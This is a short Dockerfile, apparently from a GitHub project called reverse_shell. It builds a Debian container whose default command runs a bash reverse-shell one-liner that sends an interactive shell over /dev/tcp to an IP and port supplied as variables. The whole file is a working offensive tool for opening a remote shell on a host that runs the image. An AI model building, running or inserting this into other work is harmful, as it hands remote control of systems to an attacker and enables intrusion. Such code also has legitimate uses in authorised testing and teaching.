
FROM debian:latest

LABEL maintainer="Lars Lühr and contributors <https://github.com/ayeks/reverse_shell>"

RUN echo "bash -i >& /dev/tcp/\${IP}/\${PORT} 0>&1" > reverse_shell.sh

CMD ["bash", "./reverse_shell.sh"]
